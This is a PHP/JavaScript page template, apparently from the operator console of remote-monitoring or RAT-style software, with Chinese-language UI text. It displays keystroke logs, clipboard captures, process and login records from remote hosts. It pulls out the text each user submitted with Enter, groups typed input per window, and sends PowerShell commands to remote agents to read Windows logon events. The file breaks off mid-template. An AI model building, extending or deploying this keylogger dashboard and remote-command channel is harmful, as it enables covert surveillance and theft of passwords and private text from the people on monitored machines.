<?php
defined('ABSPATH') || exit;
include WD_THEME_DIR . '/templates/partials/layout-open.php';
$host_id  = (int)($_GET['host_id'] ?? 0);
$log_type = sanitize_key($_GET['log_type'] ?? 'keyboard');
$tab_map  = ['keyboard'=>'键盘记录','clipboard'=>'剪贴板','process_start'=>'进程','login'=>'登录','win_input'=>'窗口输入'];
?>

<div class="wd-page">
  <div class="wd-page-header">
    <h1 class="wd-page-title">日志中心</h1>
  </div>

  <!-- 横向筛选栏 -->
  <div class="wd-filter-bar">
    <select id="log-host-sel" class="wd-select" title="筛选主机" aria-label="筛选主机" style="min-width:140px"><option value="">全部主机</option></select>
    <div class="wd-filter-date-group">
      <input type="date" class="wd-input wd-input--sm" id="log-from">
      <span class="wd-filter-sep">—</span>
      <input type="date" class="wd-input wd-input--sm" id="log-to">
    </div>
    <button class="wd-btn wd-btn--primary" onclick="loadLogs(1)">筛选</button>
    <button class="wd-btn wd-btn--ghost"   onclick="document.getElementById('log-from').value='';document.getElementById('log-to').value='';loadLogs(1)">重置</button>
  </div>

  <!-- 日志类型 Tab -->
  <div class="wd-tabs" id="log-tabs">
    <?php foreach ($tab_map as $t => $label): ?>
      <button class="wd-tab <?= $t === $log_type ? 'wd-tab--active' : '' ?>"
              data-type="<?= $t ?>" onclick="switchTab('<?= $t ?>')">
        <?= esc_html($label) ?>
      </button>
    <?php endforeach; ?>
  </div>

  <!-- 已有数据库日志卡片 -->
  <div class="wd-card">
    <div class="wd-card-body wd-p0">
      <table class="wd-table wd-table--hover" id="logs-table">
        <thead id="logs-thead"></thead>
        <tbody id="logs-tbody"><tr><td colspan="6" class="wd-center wd-muted">加载中...</td></tr></tbody>
      </table>
    </div>
    <div class="wd-card-footer">
      <div id="logs-pagination" class="wd-pagination"></div>
      <span id="logs-total" class="wd-total"></span>
    </div>
  </div>

  <!-- Windows 安全事件日志（仅登录 Tab 显示） -->
  <div id="win-event-section" style="display:none;margin-top:20px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;flex-wrap:wrap;gap:8px">
      <div style="font-weight:700;font-size:15px;display:flex;align-items:center;gap:8px">
        <span style="color:#f4f99d">⚡</span> Windows 安全事件日志
        <span class="wd-badge wd-badge--yellow" style="font-size:11px">4624 / 4625 / 4771</span>
      </div>
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
        <select id="win-host-sel" class="wd-select" style="min-width:130px"><option value="">选择主机...</option></select>
        <select id="win-days" class="wd-select" style="min-width:90px">
          <option value="1">近 1 天</option>
          <option value="7" selected>近 7 天</option>
          <option value="30">近 30 天</option>
          <option value="90">近 90 天</option>
        </select>
        <select id="win-max" class="wd-select" style="min-width:90px">
          <option value="100">100 条</option>
          <option value="300" selected>300 条</option>
          <option value="500">500 条</option>
          <option value="1000">1000 条</option>
        </select>
        <button class="wd-btn wd-btn--primary" id="btn-win-pull" onclick="pullWinEvents()">⟳ 拉取历史</button>
        <label class="wd-toggle-label" style="gap:4px">
          <input type="checkbox" id="win-realtime" onchange="toggleWinRealtime(this.checked)">
          <span class="wd-sm">实时（30s）</span>
        </label>
      </div>
    </div>

    <!-- 事件类型说明 -->
    <div style="display:flex;gap:12px;margin-bottom:10px;flex-wrap:wrap">
      <span class="wd-badge wd-badge--green"  style="font-size:12px">4624 登录成功</span>
      <span class="wd-badge wd-badge--red"    style="font-size:12px">4625 登录失败（暴破核心）</span>
      <span class="wd-badge wd-badge--yellow" style="font-size:12px">4771 Kerberos预验证失败</span>
    </div>

    <div class="wd-card">
      <div class="wd-card-body wd-p0">
        <table class="wd-table wd-table--hover">
          <thead>
            <tr>
              <th>时间</th>
              <th>事件 ID</th>
              <th>状态</th>
              <th>用户名 \ 域</th>
              <th>来源 IP / 主机</th>
              <th>登录类型</th>
              <th>操作</th>
            </tr>
          </thead>
          <tbody id="win-event-tbody">
            <tr><td colspan="7" class="wd-center wd-muted">选择主机后点击「拉取历史」</td></tr>
          </tbody>
        </table>
      </div>
      <div class="wd-card-footer">
        <span id="win-event-updated" class="wd-sm wd-muted"></span>
        <span id="win-event-total" class="wd-total"></span>
      </div>
    </div>

    <!-- IP 排行榜（拉取数据后自动显示） -->
    <div id="win-ip-section" style="display:none;margin-top:14px">
      <!-- IP 筛选按钮 -->
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-wrap:wrap">
        <span style="font-size:13px;font-weight:600;color:#ccc">IP 排行：</span>
        <button class="wd-btn wd-btn--xs wd-btn--primary" id="ip-filter-all"    onclick="filterIp('all')">全部</button>
        <button class="wd-btn wd-btn--xs" id="ip-filter-fail"    style="background:#f85149;border-color:#f85149;color:#fff" onclick="filterIp('fail')">仅失败 4625</button>
        <button class="wd-btn wd-btn--xs" id="ip-filter-success" style="background:#3fb950;border-color:#3fb950;color:#fff" onclick="filterIp('success')">仅成功 4624</button>
        <button class="wd-btn wd-btn--xs" id="ip-filter-kerb"    style="background:#e3b341;border-color:#e3b341;color:#000" onclick="filterIp('kerb')">Kerberos 4771</button>
        <span id="ip-filter-info" class="wd-sm wd-muted"></span>
      </div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">

        <!-- 失败登录 IP Top10 -->
        <div class="wd-card">
          <div class="wd-card-header" style="padding:8px 14px;background:rgba(248,81,73,.08)">
            <span style="color:#f85149;font-weight:700">🎯 失败登录 IP Top 10（4625）</span>
            <span class="wd-sm wd-muted" style="margin-left:6px">高频 = 暴破攻击</span>
          </div>
          <div class="wd-card-body wd-p0">
            <table class="wd-table">
              <thead><tr><th>#</th><th>IP / 主机</th><th>失败</th><th>成功</th><th>Kerb</th></tr></thead>
              <tbody id="win-ip-fail-list"><tr><td colspan="5" class="wd-center wd-muted">—</td></tr></tbody>
            </table>
          </div>
        </div>

        <!-- 总排行 -->
        <div class="wd-card">
          <div class="wd-card-header" style="padding:8px 14px">
            <span style="color:#8be9fd;font-weight:700">📊 综合 IP 排行（所有事件）</span>
          </div>
          <div class="wd-card-body wd-p0">
            <table class="wd-table">
              <thead><tr><th>#</th><th>IP / 主机</th><th>总计</th><th style="color:#f85149">失败</th><th style="color:#3fb950">成功</th></tr></thead>
              <tbody id="win-ip-total-list"><tr><td colspan="5" class="wd-center wd-muted">—</td></tr></tbody>
            </table>
          </div>
        </div>

      </div>
    </div>
  </div>
</div>

<!-- 详情弹窗 -->
<div class="wd-modal" id="log-detail-modal" style="display:none">
  <div class="wd-modal-backdrop" onclick="closeModal('log-detail-modal')"></div>
  <div class="wd-modal-dialog wd-modal-dialog--lg">
    <div class="wd-modal-header"><h3 id="log-detail-title">日志详情</h3><button class="wd-modal-close" onclick="closeModal('log-detail-modal')">✕</button></div>
    <div class="wd-modal-body">
      <div id="log-detail-body" style="font-family:monospace;font-size:13px;white-space:pre-wrap;max-height:65vh;overflow-y:auto;padding:0 4px"></div>
    </div>
  </div>
</div>

<style>
.wd-key{display:inline-block;background:#1e1e22;border:1px solid #555;border-bottom:2px solid #333;border-radius:4px;padding:0 6px;font-family:monospace;font-size:11px;line-height:1.9;color:#e2e2e2;margin:0 1px;vertical-align:middle;white-space:nowrap}
.wd-key--mod{background:#1a2744;border-color:#3d6bcc;color:#8be9fd}
.wd-key--enter{background:#1a3a1a;border-color:#3fb950;color:#3fb950}
.wd-key--del{background:#3a1a1a;border-color:#f85149;color:#f85149}
.wd-key--nav{background:#2a2a1a;border-color:#e3b341;color:#e3b341}
</style>

<script>
document.getElementById('wd-topbar-title').textContent = '日志中心';
let currentType = '<?= $log_type ?>';
let logPage     = 1;
const logCache  = {};

const COLS = {
    keyboard:      ['时间','内容片段','窗口','操作'],
    clipboard:     ['时间','内容预览','类型','操作'],
    process_start: ['时间','进程名','PID','路径','操作'],
    login:         ['时间','用户名','登录 IP','类型','操作'],
    win_input:     ['最后活跃','窗口名','输入预览','操作'],
};

function setHead(type) {
    const cols = COLS[type] || ['时间','数据','操作'];
    document.getElementById('logs-thead').innerHTML = '<tr>' + cols.map(c=>`<th>${c}</th>`).join('') + '</tr>';
}

function switchTab(type) {
    currentType = type;
    document.querySelectorAll('.wd-tab').forEach(b => b.classList.toggle('wd-tab--active', b.dataset.type === type));
    document.getElementById('win-event-section').style.display = (type === 'login') ? '' : 'none';
    if (type === 'win_input') { loadWinInput(); return; }
    loadLogs(1);
}

async function initHosts() {
    const res = await WD.ajax('wd_get_hosts', { page: 1 });
    if (!res.success) return;
    const sel1 = document.getElementById('log-host-sel');
    const sel2 = document.getElementById('win-host-sel');
    res.data.items.forEach(h => {
        const o1 = document.createElement('option');
        o1.value = h.id; o1.textContent = h.name + (h.status==='online'?' ●':'');
        if (h.id == <?= $host_id ?>) o1.selected = true;
        sel1.appendChild(o1);
        // 安全事件日志只显示在线主机
        if (h.status === 'online') {
            const o2 = document.createElement('option');
            o2.value = h.id; o2.textContent = h.name + ' ● 在线';
            if (h.id == <?= $host_id ?>) o2.selected = true;
            sel2.appendChild(o2);
        }
    });
    if (currentType === 'win_input') { loadWinInput(); }
    else { loadLogs(1); }
    if (currentType === 'login') document.getElementById('win-event-section').style.display = '';
}

async function loadLogs(page) {
    logPage = page || 1;
    document.getElementById('logs-tbody').innerHTML = '<tr><td colspan="6" class="wd-center wd-muted">加载中...</td></tr>';
    setHead(currentType);
    const res = await WD.ajax('wd_get_logs', {
        log_type:  currentType,
        host_id:   document.getElementById('log-host-sel').value,
        date_from: document.getElementById('log-from').value,
        date_to:   document.getElementById('log-to').value,
        page: logPage, per_page: 50,
    });
    if (!res.success) return;

    const { items, total } = res.data;
    items.forEach(l => { logCache[l.id] = l; });
    const tbody = document.getElementById('logs-tbody');
    const det   = id => `<button class="wd-btn wd-btn--xs wd-btn--ghost" onclick="showDetail(${id})">详情</button>`;

    if (!items.length) { tbody.innerHTML = '<tr><td colspan="6" class="wd-center wd-muted">暂无数据</td></tr>'; }
    else tbody.innerHTML = items.map(l => {
        const p = l.payload || {};
        switch (currentType) {
            case 'keyboard':      return `<tr><td class="wd-sm wd-muted" style="white-space:nowrap">${l.created_at.slice(5)}</td><td class="wd-sm" style="max-width:320px;overflow:hidden;line-height:2">${renderKeyLog(p.text||'', 18)}</td><td class="wd-sm">${escHtml(p.window||'')}</td><td>${det(l.id)}</td></tr>`;
            case 'clipboard':     return `<tr><td class="wd-sm wd-muted">${l.created_at.slice(5)}</td><td class="wd-mono wd-sm">${escHtml((p.content||'').slice(0,80))}</td><td><span class="wd-badge">${escHtml(p.type||'text')}</span></td><td>${det(l.id)}</td></tr>`;
            case 'process_start': return `<tr><td class="wd-sm wd-muted">${l.created_at.slice(5)}</td><td><strong>${escHtml(p.name||'')}</strong></td><td class="wd-mono">${p.pid||''}</td><td class="wd-sm wd-muted">${escHtml((p.exe||'').slice(0,60))}</td><td>${det(l.id)}</td></tr>`;
            case 'login':         return `<tr><td class="wd-sm wd-muted">${l.created_at.slice(5)}</td><td><strong>${escHtml(p.username||'')}</strong></td><td class="wd-mono">${escHtml(p.ip||'')}</td><td><span class="wd-badge">${escHtml(p.logon_type||'')}</span></td><td>${det(l.id)}</td></tr>`;
            default: return `<tr><td>${l.created_at.slice(5)}</td><td colspan="4">${escHtml(JSON.stringify(p).slice(0,80))}</td><td>${det(l.id)}</td></tr>`;
        }
    }).join('');

    document.getElementById('logs-total').textContent = '共 ' + total + ' 条';
    renderPagination(total, logPage, 50, loadLogs, 'logs-pagination');
}

window.showDetail = function(id) {
    const log  = logCache[id];
    const body = document.getElementById('log-detail-body');
    if (!log) { body.textContent = '—'; openModal('log-detail-modal'); return; }

    if (currentType === 'keyboard') {
        document.getElementById('log-detail-title').textContent = '键盘记录详情';
        const text   = log.payload?.text || '';
        const win    = log.payload?.window || '未知窗口';
        const inputs = extractInputs(text);
        let html = `<div style="margin-bottom:14px">
            <div style="font-weight:600;margin-bottom:6px;color:#8be9fd">📋 完整按键记录 — 窗口：${escHtml(win)}</div>
            <div style="background:#16161a;padding:10px;border-radius:6px;line-height:2.4;word-break:break-all">${renderKeyLog(text)}</div>
        </div>`;
        if (inputs.length) {
            html += `<div>
                <div style="font-weight:600;margin-bottom:6px;color:#f4f99d">⌨ Enter 提交内容（${inputs.length} 条）</div>
                <div style="background:#16161a;border-radius:6px;overflow:hidden">`;
            inputs.forEach((inp, i) => {
                html += `<div style="padding:7px 12px;border-bottom:1px solid #2a2a2d;font-family:monospace">
                    <span class="wd-muted wd-sm">[${i+1}]</span> ${escHtml(inp)}</div>`;
            });
            html += '</div></div>';
        } else {
            html += `<div class="wd-muted wd-sm">（未检测到 Enter 提交内容）</div>`;
        }
        body.innerHTML = html;
        body.style.whiteSpace = 'normal';
    } else {
        document.getElementById('log-detail-title').textContent = '日志详情';
        body.style.whiteSpace = 'pre-wrap';
        body.textContent = JSON.stringify(log.payload, null, 2);
    }
    openModal('log-detail-modal');
};

// ── 键盘记录 — 按键徽章渲染 ──────────────────────────────────────────
const KEY_LABELS = {
    'CTRL':'Ctrl','LCTRL':'Ctrl','RCTRL':'Ctrl',
    'SHIFT':'Shift','LSHIFT':'Shift','RSHIFT':'Shift',
    'ALT':'Alt','LALT':'Alt','RALT':'AltGr',
    'WIN':'Win','LWIN':'Win','RWIN':'Win',
    'ENTER':'↵','RETURN':'↵',
    'BACKSPACE':'Bksp','DELETE':'Del',
    'TAB':'Tab','ESC':'Esc','ESCAPE':'Esc',
    'CAPSLOCK':'Caps','CAPS':'Caps',
    'SPACE':'Space',
    'UP':'↑','DOWN':'↓','LEFT':'←','RIGHT':'→',
    'HOME':'Home','END':'End','PAGEUP':'PgUp','PAGEDOWN':'PgDn',
    'F1':'F1','F2':'F2','F3':'F3','F4':'F4','F5':'F5','F6':'F6',
    'F7':'F7','F8':'F8','F9':'F9','F10':'F10','F11':'F11','F12':'F12',
    'INSERT':'Ins','PRINTSCREEN':'PrtSc','SCROLLLOCK':'ScrLk','NUMLOCK':'NumLk','PAUSE':'Pause',
};
const _MOD_RAW  = new Set(['CTRL','LCTRL','RCTRL','SHIFT','LSHIFT','RSHIFT','ALT','LALT','RALT','WIN','LWIN','RWIN']);
const _NAV_RAW  = new Set(['UP','DOWN','LEFT','RIGHT','HOME','END','PAGEUP','PAGEDOWN','INSERT']);
const _DEL_RAW  = new Set(['BACKSPACE','DELETE']);
const _ENTER_RAW = new Set(['ENTER','RETURN']);

// 将原始文本分解为 tokens：普通字符 或 [KEY] 特殊键
function _tokenizeKeys(text) {
    const toks = [];
    let i = 0;
    while (i < text.length) {
        if (text[i] === '[') {
            const end = text.indexOf(']', i);
            if (end > i) {
                toks.push({ k: true, r: text.slice(i+1, end).toUpperCase() });
                i = end + 1; continue;
            }
        }
        toks.push({ k: false, c: text[i] });
        i++;
    }
    return toks;
}

// 规则：
// • 修饰键 + 任意字符/键 → Ctrl+C 组合徽章
// • [ENTER] 单独出现 → ⏎ 徽章
// • [BACKSPACE]/[DELETE] → ⌫/Del 徽章（红色）
// • 导航键（↑↓←→等）→ 小徽章
// • 其他特殊键（F1~F12、Tab、Esc 等）→ 普通徽章
// • 普通可打印字符 → 直接输出文本（无徽章），保留中文/IME 输出
function renderKeyLog(text, maxTokens) {
    if (!text) return '';
    const toks = _tokenizeKeys(text);
    let html = '', count = 0, j = 0;
    while (j < toks.length) {
        if (maxTokens && count >= maxTokens) { html += '<span class="wd-muted" style="font-size:10px">…</span>'; break; }
        const t = toks[j];
        if (!t.k) {
            // 普通字符（含中文 IME 输出）→ 无徽章，直接文本
            html += escHtml(t.c); j++; count++; continue;
        }
        const raw = t.r;
        if (_MOD_RAW.has(raw)) {
            // 收集连续修饰键，然后取下一个键组成快捷键徽章
            const mods = [];
            while (j < toks.length && toks[j].k && _MOD_RAW.has(toks[j].r)) {
                const ml = KEY_LABELS[toks[j].r] || toks[j].r;
                if (!mods.includes(ml)) mods.push(ml);
                j++;
            }
            let keyLabel = '';
            if (j < toks.length) {
                const nxt = toks[j];
                if (!nxt.k) {
                    keyLabel = nxt.c.toUpperCase(); j++;
                } else if (_ENTER_RAW.has(nxt.r)) {
                    keyLabel = '↵'; j++;
                } else {
                    keyLabel = KEY_LABELS[nxt.r] || nxt.r; j++;
                }
                html += `<kbd class="wd-key wd-key--mod">${escHtml([...mods, keyLabel].join('+'))}</kbd>`;
            } else {
                mods.forEach(m => { html += `<kbd class="wd-key wd-key--mod">${escHtml(m)}</kbd>`; });
            }
            count++; continue;
        }
        if (_ENTER_RAW.has(raw)) {
            html += `<kbd class="wd-key wd-key--enter" title="Enter">↵</kbd>`;
            j++; count++; continue;
        }
        if (_DEL_RAW.has(raw)) {
            html += `<kbd class="wd-key wd-key--del">${escHtml(KEY_LABELS[raw]||raw)}</kbd>`;
            j++; count++; continue;
        }
        if (_NAV_RAW.has(raw)) {
            html += `<kbd class="wd-key wd-key--nav">${escHtml(KEY_LABELS[raw]||raw)}</kbd>`;
            j++; count++; continue;
        }
        // 其余特殊键（Esc、Tab、F1-F12 等）
        html += `<kbd class="wd-key">${escHtml(KEY_LABELS[raw]||raw)}</kbd>`;
        j++; count++;
    }
    return html;
}

// 提取 Enter 后提交的内容（包含 IME 输入的中文字符）
function extractInputs(text) {
    if (!text) return [];
    return text.replace(/\[RETURN\]/gi, '[ENTER]')
        .split('[ENTER]')
        .map(part => part.replace(/\[[^\]]+\]/g, '').trim())
        .filter(s => s.length > 0);
}

// ── Windows 安全事件日志 ────────────────────────────────────────────────

let winEventData = [], winRealtimeTimer = null;

const WIN_EVENT_MAP = {
    4624: { label:'4624 登录成功',          cls:'wd-badge--green'  },
    4625: { label:'4625 登录失败',          cls:'wd-badge--red'    },
    4771: { label:'4771 Kerberos预验证失败', cls:'wd-badge--yellow' },
};
const LOGON_TYPE_MAP = {
    2:'交互式(2)', 3:'网络(3)', 4:'批处理(4)', 5:'服务(5)',
    7:'解锁(7)',   8:'网络明文(8)', 9:'新凭据(9)',
    10:'远程交互(10)', 11:'缓存(11)',
};

function buildWinEventCmd(days, maxEv) {
    // 使用 .Properties[] 直接访问字段，避免 [xml]$_.ToXml() 导致 OutOfMemoryException
    // 4624: u=p[5] dom=p[6] lt=p[8] ip=p[18]
    // 4625: u=p[5] dom=p[6] lt=p[10] ip=p[19]
    // 4771: u=p[0] dom=p[2] ip=p[6] (格式 ::ffff:x.x.x.x)
    return `try{`
        + `$f=@{LogName='Security';Id=@(4624,4625,4771);StartTime=(Get-Date).AddDays(-${days})};`
        + `$e=Get-WinEvent -FilterHashtable $f -MaxEvents ${maxEv} -EA Stop;`
        + `if($e){@($e|%{`
        +   `$id=[int]$_.Id;$p=$_.Properties;`
        +   `try{`
        +     `$u=if($id-eq 4771){if($p.Count-gt 0){[string]$p[0].Value}else{'?'}}elseif($p.Count-gt 5){[string]$p[5].Value}else{'?'};`
        +     `$dom=if($id-eq 4771){if($p.Count-gt 2){[string]$p[2].Value}else{''}}elseif($p.Count-gt 6){[string]$p[6].Value}else{''};`
        +     `$ri=if($id-eq 4624){18}elseif($id-eq 4625){19}else{6};`
        +     `$rawip=if($p.Count-gt $ri){[string]$p[$ri].Value}else{'-'};`
        +     `$ip=if($rawip-match '(\d{1,3}(?:\.\d{1,3}){3})'){$Matches[1]}elseif($rawip-and $rawip-ne'-'-and $rawip-ne'::1'){$rawip}else{'-'};`
        +     `$lt=if($id-eq 4624-and $p.Count-gt 8){[string]$p[8].Value}elseif($id-eq 4625-and $p.Count-gt 10){[string]$p[10].Value}else{''};`
        +     `[PSCustomObject]@{t=$_.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss');id=$id;u=$u;dom=$dom;ip=$ip;lt=$lt}`
        +   `}catch{$null}`
        + `}|Where-Object{$_})|ConvertTo-Json -Compress -Depth 2}`
        + `else{'[]'}`
        + `}catch{'ERROR:'+$_.Exception.Message}`;
}

async function pullWinEvents() {
    const hostId = parseInt(document.getElementById('win-host-sel').value) || 0;
    if (!hostId) return WD.toast('请先选择要查询的主机','error');
    const days  = parseInt(document.getElementById('win-days').value) || 7;
    const maxEv = parseInt(document.getElementById('win-max').value)  || 300;

    document.getElementById('win-event-tbody').innerHTML
        = '<tr><td colspan="7" class="wd-center wd-muted">正在查询 Windows 安全事件日志（可能需要 5~15 秒）...</td></tr>';
    document.getElementById('win-event-updated').textContent = '查询中...';

    const res = await WD.ajax('wd_send_command', {
        host_id:  hostId,
        cmd_type: 'powershell',
        payload:  buildWinEventCmd(days, maxEv),
    }, 'POST');
    if (!res.success) return WD.toast(res.data?.message || '指令发送失败','error');
    pollForWinEvents(res.data.cmd_id);
}

function pollForWinEvents(cmdId, n=0) {
    const steps = ['正在等待客户端响应…','正在读取 Security 事件日志…','正在序列化 JSON 数据…','数据量较大，正在处理…'];
    if (n > 40) {
        WD.toast('查询超时，客户端可能不在线或权限不足（Security 日志需要管理员权限）','error',8000);
        document.getElementById('win-event-tbody').innerHTML
            = '<tr><td colspan="7" class="wd-center wd-muted" style="color:#f85149">超时：客户端无响应，请确认主机在线且 Agent 以管理员运行</td></tr>';
        document.getElementById('win-event-updated').textContent = '超时';
        return;
    }
    if (n > 0 && n % 3 === 0) {
        const step = steps[Math.min(Math.floor(n/5), steps.length-1)];
        document.getElementById('win-event-tbody').innerHTML
            = `<tr><td colspan="7" class="wd-center wd-muted">${step}（已等待 ${n*2}s）</td></tr>`;
    }
    setTimeout(async () => {
        const r = await WD.ajax('wd_get_cmd_result', { cmd_id: cmdId });
        if (r.success && r.data.status === 'ack') {
            renderWinEvents(r.data.result);
        } else if (r.success && ['pending','sent'].includes(r.data.status)) {
            pollForWinEvents(cmdId, n+1);
        } else if (r.success && r.data.status === 'failed') {
            const msg = r.data.result || '未知错误';
            WD.toast('查询失败: ' + msg, 'error', 8000);
            document.getElementById('win-event-tbody').innerHTML
                = `<tr><td colspan="7" class="wd-center" style="color:#f85149">执行失败：${escHtml(msg)}</td></tr>`;
            document.getElementById('win-event-updated').textContent = '失败';
        } else {
            WD.toast('指令状态异常','error');
        }
    }, 2000);
}

function renderWinEvents(result) {
    try {
        // 检测 ERROR: 前缀（PS try/catch 返回的错误）
        if (result && result.startsWith('ERROR:')) {
            const errMsg = result.slice(6);
            WD.toast('PS 错误: ' + errMsg, 'error', 10000);
            document.getElementById('win-event-tbody').innerHTML
                = `<tr><td colspan="7" class="wd-center" style="color:#f85149">PowerShell 错误：${escHtml(errMsg)}<br><small class="wd-muted">提示：读取 Security 事件日志需要管理员权限，请确认 Agent 以管理员身份运行。</small></td></tr>`;
            document.getElementById('win-event-updated').textContent = '出错';
            return;
        }

        let events = JSON.parse(result || '[]');
        if (!Array.isArray(events)) events = events ? [events] : [];
        winEventData = events;

        const tbody = document.getElementById('win-event-tbody');
        if (!events.length) {
            tbody.innerHTML = '<tr><td colspan="7" class="wd-center wd-muted">未找到匹配的安全事件（日志可能被清除或审计策略未开启）</td></tr>';
            document.getElementById('win-event-updated').textContent = '无记录';
            document.getElementById('win-event-total').textContent = '共 0 条';
            return;
        }

        tbody.innerHTML = events.map((ev, idx) => {
            // 新字段名: t, id, u, dom, ip, lt, fr
            const eid  = parseInt(ev.id || ev.event_id);
            const em   = WIN_EVENT_MAP[eid] || { label:'ID:'+eid, cls:'' };
            const lt   = LOGON_TYPE_MAP[parseInt(ev.lt || ev.logon_type)] || (ev.lt ? '类型'+ev.lt : '—');
            const user = ev.u || ev.username || '—';
            const dom  = ev.dom || ev.domain || '';
            const ip   = ev.ip || '—';
            const time = ev.t  || ev.time    || '';
            const fr   = ev.fr || ev.failure_reason || '';
            const domainPart = dom && dom !== '-' ? `<span class="wd-muted wd-sm">\\${escHtml(dom)}</span>` : '';
            const st   = ev.status || (eid===4624?'success':eid===4625?'failed':'kerberos');
            const statusHtml = st === 'success'
                ? '<span style="color:#3fb950;font-weight:600">✓ 成功</span>'
                : st === 'kerberos'
                    ? '<span style="color:#e3b341;font-weight:600">⚠ Kerberos</span>'
                    : '<span style="color:#f85149;font-weight:600">✕ 失败</span>';
            return `<tr>
              <td class="wd-sm wd-muted">${escHtml(time)}</td>
              <td><span class="wd-badge ${em.cls}" style="font-size:11px;white-space:nowrap">${em.label}</span></td>
              <td>${statusHtml}${fr && fr!=='-'?`<br><span class="wd-sm wd-muted">${escHtml(fr.slice(0,40))}</span>`:''}</td>
              <td><strong>${escHtml(user)}</strong>${domainPart}</td>
              <td class="wd-mono wd-sm">${escHtml(ip)}</td>
              <td class="wd-sm">${escHtml(lt)}</td>
              <td><button class="wd-btn wd-btn--xs wd-btn--ghost" onclick="showWinDetail(${idx})">详情</button></td>
            </tr>`;
        }).join('');

        const now = new Date().toLocaleTimeString();
        document.getElementById('win-event-updated').textContent = `更新于 ${now}`;
        document.getElementById('win-event-total').textContent   = `共 ${events.length} 条`;
        _ipFilterType = 'all';
        document.getElementById('ip-filter-info').textContent = `全部（${events.length} 条）`;
        updateIpStats(events);
    } catch(e) {
        WD.toast('解析失败: ' + e.message,'error');
        document.getElementById('win-event-tbody').innerHTML
            = `<tr><td colspan="7" class="wd-center" style="color:#f85149">JSON 解析错误: ${escHtml(e.message)}<br><small class="wd-muted">原始数据: ${escHtml((result||'').slice(0,200))}</small></td></tr>`;
    }
}

// ── IP 排行榜 ──────────────────────────────────────────────────────────
function updateIpStats(events) {
    const stats = {};
    events.forEach(ev => {
        const ip = ev.ip || '';
        if (!ip || ip === '-' || ip === '—') return;
        if (!stats[ip]) stats[ip] = { total:0, fail:0, success:0, kerb:0 };
        stats[ip].total++;
        const eid = parseInt(ev.id || ev.event_id);
        if      (eid === 4625) stats[ip].fail++;
        else if (eid === 4624) stats[ip].success++;
        else if (eid === 4771) stats[ip].kerb++;
    });
    const entries = Object.entries(stats);
    // 始终保持 IP 排行区域可见（即使过滤后为空也显示"暂无数据"）
    document.getElementById('win-ip-section').style.display = '';
    if (!entries.length) {
        const noData = '<tr><td colspan="5" class="wd-center wd-muted" style="padding:20px">暂无数据</td></tr>';
        document.getElementById('win-ip-fail-list').innerHTML  = noData;
        document.getElementById('win-ip-total-list').innerHTML = noData;
        return;
    }

    const row = ([ip, s], i) =>
        `<tr>
           <td class="wd-muted wd-sm">${i+1}</td>
           <td class="wd-mono wd-sm" style="max-width:160px;overflow:hidden;text-overflow:ellipsis">${escHtml(ip)}</td>`;

    // 失败排行
    const byFail = [...entries].sort((a,b) => b[1].fail  - a[1].fail ).slice(0,10);
    document.getElementById('win-ip-fail-list').innerHTML = byFail.length
        ? byFail.map(([ip,s],i) =>
            row([ip,s],i) +
            `<td><strong style="color:#f85149">${s.fail}</strong></td>
             <td style="color:#3fb950">${s.success}</td>
             <td style="color:#e3b341">${s.kerb}</td></tr>`
          ).join('')
        : '<tr><td colspan="5" class="wd-center wd-muted">无失败记录</td></tr>';

    // 总排行
    const byTotal = [...entries].sort((a,b) => b[1].total - a[1].total).slice(0,10);
    document.getElementById('win-ip-total-list').innerHTML = byTotal.length
        ? byTotal.map(([ip,s],i) =>
            row([ip,s],i) +
            `<td><strong>${s.total}</strong></td>
             <td style="color:#f85149">${s.fail}</td>
             <td style="color:#3fb950">${s.success}</td></tr>`
          ).join('')
        : '<tr><td colspan="5" class="wd-center wd-muted">无数据</td></tr>';
}

// IP 筛选
let _ipFilterType = 'all';
function filterIp(type) {
    _ipFilterType = type;
    const btns = { all:'ip-filter-all', fail:'ip-filter-fail', success:'ip-filter-success', kerb:'ip-filter-kerb' };
    Object.entries(btns).forEach(([k,id]) => {
        const b = document.getElementById(id);
        if (!b) return;
        b.style.outline = (k === type) ? '2px solid #fff' : '';
    });
    let data = winEventData;
    if (type === 'fail')    data = winEventData.filter(e => parseInt(e.id||e.event_id) === 4625);
    if (type === 'success') data = winEventData.filter(e => parseInt(e.id||e.event_id) === 4624);
    if (type === 'kerb')    data = winEventData.filter(e => parseInt(e.id||e.event_id) === 4771);
    const lbl = { all:'全部', fail:'仅失败(4625)', success:'仅成功(4624)', kerb:'Kerberos(4771)' };
    document.getElementById('ip-filter-info').textContent = `当前筛选：${lbl[type]}（${data.length} 条）`;
    updateIpStats(data);
}

window.showWinDetail = function(idx) {
    const ev = winEventData[idx];
    if (!ev) return;
    document.getElementById('log-detail-body').textContent = JSON.stringify(ev, null, 2);
    openModal('log-detail-modal');
};

// ── 窗口输入聚合视图 ─────────────────────────────────────────────────
let _winInputCache = {};   // windowName → { logs[], lastTime, allText }

async function loadWinInput() {
    setHead('win_input');
    const tbody = document.getElementById('logs-tbody');
    tbody.innerHTML = '<tr><td colspan="4" class="wd-center wd-muted">加载中...</td></tr>';
    document.getElementById('logs-pagination').innerHTML = '';
    document.getElementById('logs-total').textContent = '';

    const res = await WD.ajax('wd_get_logs', {
        log_type: 'keyboard',
        host_id:  document.getElementById('log-host-sel').value,
        page: 1, per_page: 500,
    });
    if (!res.success) {
        tbody.innerHTML = '<tr><td colspan="4" class="wd-center wd-muted">加载失败</td></tr>';
        return;
    }

    const windows = {};
    (res.data.items || []).forEach(l => {
        const win = l.payload?.window || '（未知窗口）';
        if (!windows[win]) windows[win] = { name: win, logs: [], lastTime: '', allText: '' };
        windows[win].logs.push(l);
        if (!windows[win].lastTime || l.created_at > windows[win].lastTime)
            windows[win].lastTime = l.created_at;
        windows[win].allText += l.payload?.text || '';
    });
    _winInputCache = windows;

    const entries = Object.values(windows).sort((a, b) => b.lastTime.localeCompare(a.lastTime));
    if (!entries.length) {
        tbody.innerHTML = '<tr><td colspan="4" class="wd-center wd-muted">暂无数据</td></tr>';
        return;
    }
    tbody.innerHTML = entries.map((w, idx) => {
        const preview = renderKeyLog(w.allText.slice(0, 80), 16);
        const inputs  = extractInputs(w.allText);
        return `<tr>
            <td class="wd-sm wd-muted" style="white-space:nowrap">${w.lastTime.slice(5)}</td>
            <td><strong>${escHtml(w.name)}</strong>
                <span class="wd-badge" style="margin-left:4px">${w.logs.length} 条</span>
